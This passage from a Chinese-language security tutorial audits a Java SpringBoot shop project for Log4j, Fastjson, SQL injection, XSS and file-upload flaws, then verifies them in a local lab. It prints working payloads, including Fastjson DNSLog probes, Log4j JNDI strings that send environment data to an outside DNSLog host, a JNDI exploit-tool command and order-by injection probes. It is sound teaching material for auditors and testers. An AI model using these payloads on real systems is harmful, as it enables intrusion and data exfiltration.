<p><img src="/img/logger%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg" srcset="/img/loading.gif" lazyload alt="logger漏洞点关键代码"></p>
<p>对上述代码进行分析。触发漏洞点的代码为65行的<code>logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);</code>。向上追踪，发现通过<code>file.getOriginalFilename();</code>获取file的文件名后赋值给<code>originalFileName</code>。在向上追踪，file参数来自<code>admin/uploadAdminHeadImage</code>接口，通过注释我们可以知道此处为<code>管理员头像上传</code>功能。</p>
<p>总结来说：访问管理员头像上传功能，将文件名改为攻击语句，即可触发Log4j漏洞。</p>
<p>关于该漏洞验证，需跳转到<code>四、渗透测试漏洞挖掘与验证</code>部分学习，从实战渗透测试角度进行攻击验证。</p>
<h3 id="2-3、Mybatis漏洞代码审计"><a href="#2-3、Mybatis漏洞代码审计" class="headerlink" title="2.3、Mybatis漏洞代码审计"></a>2.3、Mybatis漏洞代码审计</h3><p>本项目引入的Mybatis版本为3.5.1，该版本存在远程命令执行漏洞。我们进一步探索一下。</p>
<p>Mybatis &lt; 3.5.6存在远程代码执行漏洞，CVE编号为<code>CVE-2020-26945</code>。</p>
<p>在满足以下三个条件的时候，攻击者可以触发远程代码执行：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、用户启用了内置的二级缓存（默认不开启，需手动配置）<br><br><span class="hljs-number">2</span>、用户未设置JEP-<span class="hljs-number">290</span>过滤器<br><br><span class="hljs-number">3</span>、攻击者找到了一种修改私有Map字段条目的方法，即修改org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.cache</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.PerpetualCache</span>.cache有效的缓存密钥<br></code></pre></td></tr></table></figure>

<p>所谓二级缓存，也就是将查询结果放到缓存中，下次查询时结果相同的话直接从缓存中获取结果。</p>
<p>经过探索<code>src\main\resources\mybatis</code>下面的配置文件，本项目并<code>未开启</code>二级缓存。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Mybatis开启二级缓存语句<br>&lt;setting name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cacheEnabled&quot;</span> value <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span> /&gt;<br></code></pre></td></tr></table></figure>

<p>关键条件被否定，即不存在该漏洞，故忽略。</p>
<p>在审计到其他项目时，可以着重注意下版本号，以及开启二级缓存的语句。</p>
<p>关于该漏洞详情可以查阅下面地址：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mybatis/my</span>batis-<span class="hljs-number">3</span><span class="hljs-regexp">/pull/</span><span class="hljs-number">2079</span><br></code></pre></td></tr></table></figure>



<h3 id="3、单点漏洞审计"><a href="#3、单点漏洞审计" class="headerlink" title="3、单点漏洞审计"></a>3、单点漏洞审计</h3><p>对组件是否存在漏洞进行验证后，我们针对功能单点代码审计，发现存在的漏洞。</p>
<p>对于单点功能代码审计除了特定漏洞存在特定代码审计方法，一般我习惯先去看一遍Controller层代码，了解基本功能。再从功能出发进行代码审计。</p>
<h3 id="3-1、SQL注入漏洞代码审计"><a href="#3-1、SQL注入漏洞代码审计" class="headerlink" title="3.1、SQL注入漏洞代码审计"></a>3.1、SQL注入漏洞代码审计</h3><p>本项目使用了Mybatis，来定义SQL。我们主要查看Myabatis中<code>xxxMapper.xml</code>文件中是否存在使用<code>$</code>拼接SQL语句的情况。使用<code>$</code>是直接拼接SQL语句的，未进行转义。</p>
<p>全局搜索关键字<code>$</code>，确实存在几处<code>order by</code>使用了<code>$</code>拼接SQL语句，因为<code>order by</code>是没办法使用<code>#&#123;&#125;</code>的。搜索结果如下图所示：</p>
<p><img src="/img/sql%E6%B3%A8%E5%85%A5%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97.jpg" srcset="/img/loading.gif" lazyload alt="sql注入搜索关键字"></p>
<p>以<code>UserMapper.xml</code>文件为例，进行逆向追踪。</p>
<p>①、双击进入<code>UserMapper.xml</code>文件，第78行存在问题。向上查看根据<code>select id</code>追踪该dao层的代码文件。如果在IDEA中安装插件<code>Free Mybatis plugin</code>是可以快速进行跳转到代码文件，只需点击左侧绿色箭头即可，如下图所示：</p>
<p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E8%B7%B3%E8%BD%AC.jpg" srcset="/img/loading.gif" lazyload alt="sql注入快速跳转"></p>
<p>②、跳转到dao层代码文件，可以看到select函数中存在<code>orderUitl</code>参数，我们继续逆向追踪，看看参数值从何而来。</p>
<p><img src="/img/mapperjava%E6%96%87%E4%BB%B6.jpg" srcset="/img/loading.gif" lazyload alt="mapperjava文件"></p>
<p>③、键盘按住<code>ctrl</code>键后鼠标左击<code>select</code>，查看谁使用该函数，如下图所示：</p>
<p><img src="/img/%E6%9F%A5%E7%9C%8Bselect%E4%BD%BF%E7%94%A8.jpg" srcset="/img/loading.gif" lazyload alt="查看select使用"></p>
<p>④、可以看到有两个文件使用了该函数方法，点击<code>UserServiceImpl.java</code>文件，定位到37行。如下图所示：</p>
<p><img src="/img/sql%E6%B3%A8%E5%85%A5impl%E5%B1%82.jpg" srcset="/img/loading.gif" lazyload alt="sql注入impl层"></p>
<p>⑤、从上图可以看出。<code>getList</code>方法中需要<code>orderUtil</code>参数，我们继续逆向追踪，看看orderUtil又是从何而来。首先看看谁使用了<code>getList</code>方法，键盘按住<code>ctrl</code>键后鼠标左击<code>getList</code>，如下图所示：</p>
<p><img src="/img/getlist%E4%BD%BF%E7%94%A8.jpg" srcset="/img/loading.gif" lazyload alt="getlist使用"></p>
<p>⑥、可以看到<code>UserController.java</code>使用了该方法，且第170行中传入了<code>orderUtil</code>值，进入文件查看具体代码，如下图所示：</p>
<p><img src="/img/UserController%E7%9A%84SQL%E6%B3%A8%E5%85%A5.jpg" srcset="/img/loading.gif" lazyload alt="UserController的SQL注入"></p>
<p>⑦、针对上述文件进行分析，先看161行实例化OrderUitl工具类，该类需要两个参数即，<code>orderyBy和isDesc</code>。点击进入查看该类的代码，该类文件位于<code>src\main\java\com\xq\tmall\util\OrderUtil.java</code>。通过注释了解该类用于排序&#x2F;倒序字段。如下图所示：</p>
<p><img src="/img/orderUitl%E7%B1%BB.jpg" srcset="/img/loading.gif" lazyload alt="orderUitl类"></p>
<p>⑧、此时应该追踪<code>orderBy</code>参数是从何而来。从下图可以看到，该值通过<code>admin/user/&#123;index&#125;/&#123;count&#125;</code>接口传过来的。通过注释可以看出来该接口用于按条件查询用户，如下图所示：</p>
<p><img src="/img/orderby%E5%AD%97%E6%AE%B5.jpg" srcset="/img/loading.gif" lazyload alt="orderby字段"></p>
<p>整个流程串下来，确定了漏洞点为<code>orderby</code>参数，该参数值来源于<code>按条件查询用户</code>。</p>
<p>既然接口找到了，我们可以使用BurpSuite或者Postman来构造请求，然后进一步攻击验证。或者，通过注释我们了解到该接口为查询用户，我们访问后台寻找功能点，发现用户管理翻页查询会向该接口发送请求数据包，如下图所示：</p>
<p><img src="/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD.jpg" srcset="/img/loading.gif" lazyload alt="用户管理功能"></p>
<p>点击翻页时，使用BurpSuite抓取数据包，可以看到发送数据包中存在orderby字段，如下图所示：</p>
<p><img src="/img/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%BF%BB%E9%A1%B5%E6%8A%93%E5%8C%85.jpg" srcset="/img/loading.gif" lazyload alt="用户管理翻页抓包"></p>
<p>至此，SQL注入漏洞代码审计完毕。</p>
<p>确定了用户管理功能翻页查询数据处存在SQL注入。</p>
<p>关于SQL注入漏洞我们放在渗透测试部分进行实战验证。</p>
<h3 id="3-2、XSS漏洞代码审计"><a href="#3-2、XSS漏洞代码审计" class="headerlink" title="3.2、XSS漏洞代码审计"></a>3.2、XSS漏洞代码审计</h3><p>从开发视觉来看防护XSS漏洞，大多是过滤&#x2F;转义用户的输入和输出。对于开发人员来说，不可能对每一个输入和输出点进行过滤&#x2F;转义。一般常使用filter层（过滤器）或拦截器进行统一过滤。</p>
<p>或者所使用的前端框架自带防XSS机制。</p>
<p>所以，我们审计XSS漏洞第一步看看filter层是否存在XSS过滤代码。对本项目审计发现filter层并没有关于防护XSS的代码，如下图所示：</p>
<p><img src="/img/fillter%E5%B1%82.jpg" srcset="/img/loading.gif" lazyload alt="fillter层"></p>
<p>第二步，我们看看使用的前端框架是什么，版本是多少，以及是否存在防XSS漏洞机制。经过一番查找，发现pom.xml和webapp文件下，都表明使用了传统的JSP。JSP大多配合Filter进行XSS防护，上述我们发现filter层并没有XSS防护机制。</p>
<p><img src="/img/pom%E5%BC%95%E5%85%A5jsp.jpg" srcset="/img/loading.gif" lazyload alt="pom引入jsp"></p>
<p>经上述验证，本项目存在XSS漏洞。我们从渗透测试实战角度进一步验证。</p>
<h3 id="3-3、任意文件上传代码审计"><a href="#3-3、任意文件上传代码审计" class="headerlink" title="3.3、任意文件上传代码审计"></a>3.3、任意文件上传代码审计</h3><p>在做Log4j漏洞代码审计时，我们发现<code>管理员头像上传</code>存在文件上传功能，对于该功能，我们主要审计一下是否存在任意文件上传漏洞。</p>
<p>一般，对于代码审计任意文件上传漏洞来说，首先是看看是否存在文件上传功能，然后进一步审计是否存在任意文件上传漏洞。</p>
<p>或者我们可以查看Controller层所有代码，缕清项目大致有哪些功能点。</p>
<p>或者搜索相关关键字，文件上传关键字如下：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">File<br>FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure>

<p>但对于<code>SpingBoot项目</code>来说，想要SpringBoot内嵌的Tomcat对JSP解析，一定要引入相关依赖。如下图所示：</p>
<p><img src="/img/JSP%E4%BE%9D%E8%B5%96.jpg" srcset="/img/loading.gif" lazyload alt="JSP依赖"></p>
<p>对于很多SpringBoot项目来说，是无需引入解析JSP依赖的。那么对于任意文件上传漏洞来说，上传JSP木马肯定是没有办法解析的。对于任意文件上传漏洞利用，只能通过内存马等方式进行攻击了。后面会有相关项目练习。</p>
<p>这次，我们先关注本项目的<code>管理员头像上传</code>文件上传功能，进行代码审计。</p>
<p>已知本项目引入了对JSP解析的依赖，下面我们审计管理员头像上传功能的关键代码，看看能否上传JSP木马。代码如下图所示：</p>
<p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81.jpg" srcset="/img/loading.gif" lazyload alt="文件上传关键代码"></p>
<p><strong>代码审计分析：</strong></p>
<p>①、第62行，通过<code>@RequestMapping</code>注解，我们得到如下几个信息：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.上传接口为admin/uploadAdminHeadImage（如果找不到前端页面，可以直接向该接口发送构造好的数据包）<br><span class="hljs-number">2</span>.上传方法为POST<br><span class="hljs-number">3</span>.produces = <span class="hljs-string">&quot;application/json;charset=UTF-8，定义了返回格式为JSON</span><br>关键信息为接口地址<br></code></pre></td></tr></table></figure>

<p>②、第63行，<code>uploadAdminHeadImage</code>方法接受绑定的<code>file参数</code>和<code>session参数</code>，我们主要关注<code>file</code>参数。</p>
<p>③、第64行，获取到文件名称后赋值给<code>originalFileName</code>。</p>
<p>④、第67行，是获取文件后缀名，先看括号内<code>originalFileName.lastIndexOf(&#39;.&#39;)</code>，获取<code>originalFileName</code>字符串最后一次出现<code>.</code>的地方。然后通过<code>substring</code>截取子串的方式得到文件后缀名，赋值给变量<code>extension</code>。也就是说，尽管出现<code>.jsp.jsp.jsp</code>这种形式后缀名，最后得到的结果也只有<code>.jsp</code>。</p>
<p>⑤、第69行，随机命名文件，采用<code>UUID+extension</code>方式，并赋值给<code>fileName</code>参数。</p>
<p>⑥、第71行，获取上传路径，赋值给<code>filePath</code>。</p>
<p>⑦、第76到80行，上传文件关键代码，创建文件流将文件上传到<code>filePath</code>路径中，上传成功后，会返回该文件的文件名。</p>
<p>至此，上传流程代码审计结束。整个流程串下来，我们发现并没有相关过滤恶意后缀名的代码。本项目中filter层也没有相关过滤代码。</p>
<p>经过分析确定该位置存在任意文件上传漏洞。</p>
<p>关于其他地方是否还存在任意文件上传漏洞呢？留个作业，大家练习一下。</p>
<p>关于任意文件上传漏洞验证，我们放在渗透测试实战部分进行验证。</p>
<h2 id="四、渗透测试漏洞挖掘与验证"><a href="#四、渗透测试漏洞挖掘与验证" class="headerlink" title="四、渗透测试漏洞挖掘与验证"></a>四、渗透测试漏洞挖掘与验证</h2><h3 id="2-1、登录处可暴力破解"><a href="#2-1、登录处可暴力破解" class="headerlink" title="2.1、登录处可暴力破解"></a>2.1、登录处可暴力破解</h3><p>前台用户登录处，管理后台登录处均没有图形验证码，以及其他防暴力破解措施。可以对账号进行爆破破解。</p>
<p>此处不过多展开，可以学习第一套课程文章。</p>
<h3 id="2-2、Fastjson漏洞验证"><a href="#2-2、Fastjson漏洞验证" class="headerlink" title="2.2、Fastjson漏洞验证"></a>2.2、Fastjson漏洞验证</h3><p>经过代码审计发现本项目存在FastJson漏洞。从漏洞触发点追踪到了用户输入点。下面我们从渗透测试阶段进行实战验证。</p>
<p>漏洞面为添加产品信息的<code>admin/product</code>接口，其中漏洞输入点为<code>propertyJson</code>参数。</p>
<p>定位代码位置，发现该代码位于<code>admin</code>路径下。根据代码结构，可以断定该功能在管理后台，如下图所示：</p>
<p><img src="/img/fastjson%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84.png" srcset="/img/loading.gif" lazyload alt="fastjson代码路径"></p>
<p>访问管理后台，经过一番查找，发现漏洞输入点位于<code>所有产品-添加一件产品</code>功能下。</p>
<p>点击添加一件产品后，使用BurpSuite抓包拦截记录请求数据包，发现请求地址为<code>admin/product</code>，并且产品属性信息为<code>propertyJson</code>字段参数，如下图所示：</p>
<p><img src="/img/%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BB%B6%E5%95%86%E5%93%81%E6%BC%8F%E6%B4%9E%E7%82%B9.png" srcset="/img/loading.gif" lazyload alt="添加一件商品漏洞点"></p>
<p>将上面的数据包，发送到Repeater模块，用于后续漏洞验证。</p>
<p>对<code>propertyJson</code>参数值进行URL解码，发现为JSON格式字符串，如下图所示：</p>
<p><img src="/img/url%E8%A7%A3%E7%A0%81%E5%8F%82%E6%95%B0.png" srcset="/img/loading.gif" lazyload alt="url解码参数"></p>
<h4 id="2-2-1、出网漏洞验证"><a href="#2-2-1、出网漏洞验证" class="headerlink" title="2.2.1、出网漏洞验证"></a>2.2.1、出网漏洞验证</h4><p>①、访问在线DNSlog地址，比如：<code>http://dnslog.cn/</code>，<code>https://log.咕.com/</code>。</p>
<p>②、点击获取一个子域名，如下图所示：</p>
<p><img src="/img/fastjson%E8%8E%B7%E5%8F%96dnslog.png" srcset="/img/loading.gif" lazyload alt="fastjson获取dnslog"></p>
<p>③、下面，我们构造漏洞验证POC：<code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;4ssfle.dnslog.cn&quot;&#125;</code>，将其粘贴到<code>propertyJson</code>字段中。如下图所示：</p>
<p><img src="/img/fastjson%E6%BC%8F%E6%B4%9Epoc.png" srcset="/img/loading.gif" lazyload alt="fastjson漏洞poc"></p>
<p>④、点击发送数据包后，稍等一小会，访问NDSLog地址，点击<code>Refresh Record</code>，可以看到获取到回显信息，成功触发了Fastjson漏洞，如下图所示：</p>
<p><img src="/img/fastjson-dnslog%E6%88%90%E5%8A%9F%E6%8E%A2%E6%B5%8B.png" srcset="/img/loading.gif" lazyload alt="fastjson-dnslog成功探测"></p>
<p>至此，通过DNSLog方式，对Fastjson漏洞进行了验证，并证明该漏洞存在。</p>
<p>更多验证漏洞POC：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>



<h3 id="2-3、Log4j漏洞验证"><a href="#2-3、Log4j漏洞验证" class="headerlink" title="2.3、Log4j漏洞验证"></a>2.3、Log4j漏洞验证</h3><p>从代码审计处分析发现Log4j存在漏洞，我们通过渗透测试进一步验证，并利用该漏洞。</p>
<p>首先，登录管理后台，访问<code>我的账户-管理员头像</code>。</p>
<p><img src="/img/%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B4%E5%83%8F%E5%A4%84.jpg" srcset="/img/loading.gif" lazyload alt="管理员头像处"></p>
<p>然后，打开BurpSuite，浏览器配置还代理地址指向BurpSuite。点击管理员头像处，选择任意图片后，点击上传，此时BurpSuite拦截到上传数据包，如下图所示：</p>
<p><img src="/img/%E4%B8%8A%E4%BC%A0%E6%8A%93%E5%8C%85.jpg" srcset="/img/loading.gif" lazyload alt="上传抓包"></p>
<p>最后，将数据包，发送到<code>Repeater模块</code>，以备后续验证使用。</p>
<h4 id="2-3-1、出网漏洞验证"><a href="#2-3-1、出网漏洞验证" class="headerlink" title="2.3.1、出网漏洞验证"></a>2.3.1、出网漏洞验证</h4><p>使用在线DNSlog，搭配POC进行漏洞验证。具体操作如下。</p>
<p>访问在线DNSlog地址，比如：<code>http://dnslog.cn/</code>，<code>https://log.咕.com/</code>。</p>
<p>①、访问上述任意DNSlog地址，点击<code>Get Subdomain</code>获取一个地址，如下图所示：</p>
<p><img src="/img/%E8%8E%B7%E5%8F%96dnslog%E5%9C%B0%E5%9D%80.jpg" srcset="/img/loading.gif" lazyload alt="获取dnslog地址"></p>
<p>②、复制获取的地址，拼凑成漏洞验证POC：<code>$&#123;jndi:ldap://8xxxxx.dnslog.cn&#125;</code>，将其粘贴到上面数据包<code>filename</code>处，如下图所示：</p>
<p><img src="/img/%E7%B2%98%E8%B4%B4%E6%9E%84%E9%80%A0%E7%9A%84dnslog%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5.jpg" srcset="/img/loading.gif" lazyload alt="粘贴构造的dnslog验证语句"></p>
<p>③、点击发送数据包后，访问DNSlog网站，点击<code>Refresh Record</code>，可以看到获取到了访问记录数据，如下图所示：</p>
<p><img src="/img/dnslog%E6%8E%A5%E5%8F%97%E6%8E%A2%E6%B5%8B.jpg" srcset="/img/loading.gif" lazyload alt="dnslog接受探测"></p>
<h4 id="2-3-2、出网外带信息"><a href="#2-3-2、出网外带信息" class="headerlink" title="2.3.2、出网外带信息"></a>2.3.2、出网外带信息</h4><p>Log4j处理<code>$&#123;&#125;</code>是采用递归方式解析。也就是说有几个<code>$&#123;&#125;</code>表达式，就使用对应的Lookup解析几个。</p>
<p>因此，我们可以配合使用DNSLog来进行信息外带。具体操作如下。</p>
<p>①、打开DNSLog地址，点击获取一个子域名地址。</p>
<p>②、复制子域名地址，拼凑出攻击POC：<code>$&#123;jndi:ldap://$&#123;env:OS&#125;.8o4koq.dnslog.cn&#125;</code>，将其粘贴到上传头像数据包中的filename处，如下图所示：</p>
<p><img src="/img/%E5%A4%96%E5%B8%A6OS%E4%BF%A1%E6%81%AF.jpg" srcset="/img/loading.gif" lazyload alt="外带OS信息"></p>
<p>④、点击发送数据包，观察DNSLog结果，得到外带信息结果，如下图所示：</p>
<p><img src="/img/%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%9C.png" srcset="/img/loading.gif" lazyload alt="外带信息结果"></p>
<p>关于本漏洞可更多外带的信息，推荐学习下面这篇文章：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jas502n/</span>Log4j2-CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span><br></code></pre></td></tr></table></figure>



<h4 id="2-3-3、进一步利用JNDI注入工具探索"><a href="#2-3-3、进一步利用JNDI注入工具探索" class="headerlink" title="2.3.3、进一步利用JNDI注入工具探索"></a>2.3.3、进一步利用JNDI注入工具探索</h4><p>经过简单探测验证，发现头像上传功能的确存在Log4j的远程代码执行漏洞。一般验证到此也就结束了。但本着热爱学习态度，岂能不进一步研究一下呢。当然，下述行为<code>请勿进行未授权渗透测试等违法行为</code>，仅为了学习研究。</p>
<p>此步骤利用到的工具<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>同时打包放在了分享文件中。Java版本还是<code>1.8.0_261</code>。<strong>注意：</strong>要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p>
<p>①、打开命令行进入该工具目录，键入命令<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code>（<code>-C 远程class文件中要执行的命令。本例子为弹计算器</code>） ，该工具给出了可利用的攻击命令，如下图所示：</p>
<p><img src="/img/jdni%E5%B7%A5%E5%85%B7%E5%90%AF%E5%8A%A8.jpg" srcset="/img/loading.gif" lazyload alt="jdni工具启动"></p>
<p>②、根据项目环境，我们选择使用第三个，<code>trustURLCodebase为false</code>，并且项目也是基于Tomcat8+，SpringBoot1.2.x+的。如果实在拿捏不准，大不了几个都试试。复制第三个攻击链接，将其粘贴到头像上传数据包中的filename处，如下图所示：</p>
<p><img src="/img/jndi%E5%B7%A5%E5%85%B7%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%93%BE%E6%8E%A5.jpg" srcset="/img/loading.gif" lazyload alt="jndi工具第三个链接"></p>
<p>③、点击发送数据包，稍等一会后，会发现本地弹出来了计算器，如下图所示：</p>
<p><img src="/img/jndi%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8.jpg" srcset="/img/loading.gif" lazyload alt="jndi弹计算器"></p>
<p>至此，我们通过出网和不出网方式进行了验证，以及使用JNDI注入工具进行了<code>弹计算器</code>操作，当然对于JNDI注入工具的功能不仅仅如此。</p>
<p>后面关于Log4j漏洞反弹shell我会写个专项课程文章。</p>
<p>老规矩，针对这块留个作业，大家先行练习如何利用该工具进行反弹shell。</p>
<p>当然大家也可以将本项目打包成war包后，部署在Linux环境中进行练习。</p>
<h3 id="2-4、SQL注入漏洞验证"><a href="#2-4、SQL注入漏洞验证" class="headerlink" title="2.4、SQL注入漏洞验证"></a>2.4、SQL注入漏洞验证</h3><p>从代码审计处，我们发现了存在SQL注入的漏洞功能点<code>用户管理-点击下一页按钮</code>，会向后端发送查询数据包，其中存在漏洞参数<code>orderBy</code>。</p>
<p>现在，我们从渗透测试角度，对该漏洞进行验证。</p>
<p>首先，我们访问该功能，再点击下一页的时候，使用BurpSuite抓取数据包，如下图所示：</p>
<p><img src="/img/sql%E6%B3%A8%E5%85%A5%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%8C%85.jpg" srcset="/img/loading.gif" lazyload alt="sql注入用户管理数据包"></p>
<p>用户管理处测试数据本身不多，无法点击下一页，大家可以自行构造上述数据包。</p>
<h4 id="2-4-1、初步判断"><a href="#2-4-1、初步判断" class="headerlink" title="2.4.1、初步判断"></a>2.4.1、初步判断</h4><p>使用orderBy子句，猜解列数。</p>
<p><code>orderBy=1</code>，返回正常数据</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8088</span><span class="hljs-regexp">/tmall/</span>admin<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span>/<span class="hljs-number">10</span>?user_name=&amp;user_gender_array=&amp;orderBy=<span class="hljs-number">1</span>&amp;isDesc=true<br></code></pre></td></tr></table></figure>

<p><img src="/img/orderby%E7%AD%89%E4%BA%8E1.jpg" srcset="/img/loading.gif" lazyload alt="orderby等于1"></p>
<p><code>orderBy=99</code>，返回错误页面</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8088</span><span class="hljs-regexp">/tmall/</span>admin<span class="hljs-regexp">/user/</span><span class="hljs-number">1</span>/<span class="hljs-number">10</span>?user_name=&amp;user_gender_array=&amp;orderBy=<span class="hljs-number">99</span>&amp;isDesc=true<br></code></pre></td></tr></table></figure>

<p><img src="/img/orderby%E7%AD%89%E4%BA%8E99.jpg" srcset="/img/loading.gif" lazyload alt="orderby等于99"></p>
<p>基本确定存在<code>order by类型的SQL注入</code>。</p>
<h4 id="2-4-2、进一步验证判断"><a href="#2-4-2、进一步验证判断" class="headerlink" title="2.4.2、进一步验证判断"></a>2.4.2、进一步验证判断</h4><ul>
<li>①、使用rand函数结果显示排序方式不同</li>
</ul>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>②、利用regexp（正则表达式）</li>
</ul>
